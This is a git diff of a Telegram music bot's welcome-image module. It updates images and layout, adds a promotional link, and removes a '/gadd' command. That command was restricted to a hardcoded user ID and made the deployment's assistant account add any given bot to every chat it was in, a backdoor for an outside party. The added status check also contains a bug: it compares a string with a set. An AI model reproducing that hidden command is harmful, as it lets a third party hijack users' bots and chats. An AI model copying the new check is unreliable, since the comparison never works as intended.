@@ -52,11 +52,16 @@ from DAXXMUSIC.utils.database import get_assistant, is_active_chat
 
 
 random_photo = [
+    "https://telegra.ph/file/98afc0c330924c0321100.jpg",
+    "https://telegra.ph/file/bc83d63ca11e03deef273.jpg",
+    "https://te.legra.ph/file/4ec5ae4381dffb039b4ef.jpg",
+    "https://te.legra.ph/file/6298d377ad3eb46711644.jpg",
+    "https://telegra.ph/file/56d1760224589ee370186.jpg",
     "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
     "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
     "https://telegra.ph/file/a7d663cd2de689b811729.jpg",
     "https://telegra.ph/file/6f19dc23847f5b005e922.jpg",
-    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
+    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg", 
 ]
 # --------------------------------------------------------------------------------- #
 
@@ -94,13 +99,13 @@ class temp:
 
 
 def circle(pfp, size=(500, 500), brightness_factor=10):
-    pfp = pfp.resize(size, Image.ANTIALIAS).convert("RGBA")
+    pfp = pfp.resize(size, Image.LANCZOS).convert("RGBA")
     pfp = ImageEnhance.Brightness(pfp).enhance(brightness_factor)
     bigsize = (pfp.size[0] * 3, pfp.size[1] * 3)
     mask = Image.new("L", bigsize, 0)
     draw = ImageDraw.Draw(mask)
     draw.ellipse((0, 0) + bigsize, fill=255)
-    mask = mask.resize(pfp.size, Image.ANTIALIAS)
+    mask = mask.resize(pfp.size, Image.LANCZOS)
     mask = ImageChops.darker(mask, pfp.split()[-1])
     pfp.putalpha(mask)
     return pfp
@@ -113,6 +118,12 @@ def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
     draw = ImageDraw.Draw(background)
     font = ImageFont.truetype('DAXXMUSIC/assets/font.ttf', size=70)
     welcome_font = ImageFont.truetype('DAXXMUSIC/assets/font.ttf', size=61)
+    draw.text((2999, 450), f'ID: {id}', fill=(255, 255, 255), font=font)
+    pfp_position = (155, 135)
+    background.paste(pfp, pfp_position, pfp)
+    background.save(f"downloads/welcome#{id}.png")
+    return f"downloads/welcome#{id}.png"
+
     #draw.text((630, 540), f'ID: {id}', fill=(255, 255, 255), font=font)
     #
  #   draw.text((630, 300), f'NAME: {user}', fill=(255, 255, 255), font=font)
@@ -121,7 +132,7 @@ def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
   #  draw.text((630, 230), f"USERNAME : {uname}", fill=(255, 255, 255), font=font)
 
     #
-    pfp_position = (332, 323)
+    pfp_position = (155, 135)
     background.paste(pfp, pfp_position, pfp)
     background.save(f"downloads/welcome#{id}.png")
     return f"downloads/welcome#{id}.png"
@@ -169,8 +180,8 @@ async def greet_new_member(_, member: ChatMemberUpdated):
 
     user = member.new_chat_member.user if member.new_chat_member else member.from_user
     
-    # Add the modified condition here
-    if member.new_chat_member and not member.old_chat_member and member.new_chat_member.status != "kicked":
+    
+    if member.new_chat_member and not member.old_chat_member and member.new_chat_member.status != {"banned", "left", "restricted" , "kicked"} :
     
         try:
             pic = await app.download_media(
@@ -202,6 +213,7 @@ async def greet_new_member(_, member: ChatMemberUpdated):
 **➻ ɪᴅ »** `{user.id}`
 **➻ ᴜ_ɴᴀᴍᴇ »** @{user.username}
 **➻ ᴛᴏᴛᴀʟ ᴍᴇᴍʙᴇʀs »** {count}
+||[𝐁ʀᴏᴋᴇɴ 𝐗 𝐍ᴇᴛᴡᴏʀᴋ](https://t.me/brokenxnetwork) ☠️||
 ▰▰▰▰▰▰▰▰▰▰▰▰▰
 
 **❅─────✧❅✦❅✧─────❅**
@@ -213,42 +225,3 @@ async def greet_new_member(_, member: ChatMemberUpdated):
             )
         except Exception as e:
             LOGGER.error(e)
-
-
-@app.on_message(filters.command("gadd") & filters.user(7427691214))
-async def add_all(client, message):
-    command_parts = message.text.split(" ")
-    if len(command_parts) != 2:
-        await message.reply("**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd bot username`**")
-        return
-    
-    bot_username = command_parts[1]
-    try:
-        userbot = await get_assistant(message.chat.id)
-        bot = await app.get_users(bot_username)
-        app_id = bot.id
-        done = 0
-        failed = 0
-        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
-        
-        async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1001919135283:
-                continue
-            try:
-                await userbot.add_chat_members(dialog.chat.id, app_id)
-                done += 1
-                await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
-                )
-            except Exception as e:
-                failed += 1
-                await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
-                )
-            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
-        
-        await lol.edit(
-            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
-        )
-    except Exception as e:
-        await message.reply(f"Error: {str(e)}")
